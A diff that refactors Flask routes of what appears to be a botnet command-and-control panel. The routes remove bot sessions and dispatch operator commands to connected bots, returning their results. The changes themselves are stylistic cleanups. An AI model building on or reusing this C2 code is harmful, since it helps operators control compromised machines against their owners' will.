@@ -30,12 +30,10 @@ def session_remove():
 		except Exception as e:
 			return "Error ending session - please try again."
 
-	# remove session from database
-	s = Session.query.filter_by(owner=current_user.username, uid=session_uid)
-	if s:
+	if s := Session.query.filter_by(owner=current_user.username, uid=session_uid):
 		s.delete()
 		db.session.commit()
-		return "Session {} removed.".format(session_uid)
+		return f"Session {session_uid} removed."
 
 
 @session.route("/api/session/cmd", methods=["POST"])
@@ -46,7 +44,7 @@ def session_cmd():
 
 	# validate session id is valid integer
 	if not session_uid:
-		flash("Invalid bot UID: " + str(session_uid))
+		flash(f"Invalid bot UID: {str(session_uid)}")
 		return redirect(url_for('sessions'))
 
 	command = request.form.get('cmd')
@@ -54,22 +52,20 @@ def session_cmd():
 	# get user sessions
 	owner_sessions = server.c2.sessions.get(current_user.username, {})
 
-	if session_uid in owner_sessions:
-		session_thread = owner_sessions[session_uid]
+	if session_uid not in owner_sessions:
+		return f"Bot {str(session_uid)} is offline or does not exist."
+	session_thread = owner_sessions[session_uid]
 
-		# store issued task in database
-		task = database.handle_task({'task': command, 'session': session_thread.info.get('uid')})
+	# store issued task in database
+	task = database.handle_task({'task': command, 'session': session_thread.info.get('uid')})
 
-		# send task and get response
-		session_thread.send_task(task)
-		response = session_thread.recv_task()
+	# send task and get response
+	session_thread.send_task(task)
+	response = session_thread.recv_task()
 
-		# update task record with result in database
-		result = database.handle_task(response)
-		return str(result['result']).encode()
-
-	else:
-		return "Bot " + str(session_uid) + " is offline or does not exist."
+	# update task record with result in database
+	result = database.handle_task(response)
+	return str(result['result']).encode()
 
 
 @session.route("/api/session/poll", methods=["GET"])
